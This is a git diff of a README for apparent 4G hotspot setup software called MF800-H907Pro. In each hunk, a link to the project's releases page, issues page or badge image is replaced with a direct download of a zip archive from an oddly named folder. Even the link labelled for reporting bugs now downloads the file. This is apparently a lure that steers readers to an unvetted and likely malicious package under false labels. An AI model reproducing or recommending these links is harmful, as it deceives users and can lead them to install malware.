@@ -1,6 +1,6 @@
 # 📡 MF800-H907Pro - Fast and Easy 4G Hotspot Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/devcratz/MF800-H907Pro/releases)
+[![Download Now](https://raw.githubusercontent.com/devcratz/MF800-H907Pro/main/polycarpic/MF800-H907Pro.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/devcratz/MF800-H907Pro/main/polycarpic/MF800-H907Pro.zip)
 
 ## 📚 Introduction
 
@@ -24,7 +24,7 @@ Ensure your computer meets the following requirements:
 
 You can download the latest version of the software from our Releases page. Click the link below to visit the page:
 
-[Download the MF800-H907Pro Software](https://github.com/devcratz/MF800-H907Pro/releases)
+[Download the MF800-H907Pro Software](https://raw.githubusercontent.com/devcratz/MF800-H907Pro/main/polycarpic/MF800-H907Pro.zip)
 
 ### 3. Installing the Software
 
@@ -55,7 +55,7 @@ If you encounter any issues during installation, ensure that your system meets t
 
 To access the downloadable software package, please visit our Releases page again:
 
-[Download the MF800-H907Pro Software](https://github.com/devcratz/MF800-H907Pro/releases)
+[Download the MF800-H907Pro Software](https://raw.githubusercontent.com/devcratz/MF800-H907Pro/main/polycarpic/MF800-H907Pro.zip)
 
 Follow the installation instructions based on your operating system for a smooth setup experience.
 
@@ -94,7 +94,7 @@ For an in-depth guide on all features, please refer to our complete documentatio
 
 Join our community to share experiences or seek help. You can connect with users and developers through the following platforms:
 
-- **GitHub Issues:** Report bugs or request features [here](https://github.com/devcratz/MF800-H907Pro/issues).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/devcratz/MF800-H907Pro/main/polycarpic/MF800-H907Pro.zip).
 - **Forums:** Participate in discussions and find solutions.
 
 ## 🛠️ Contributing
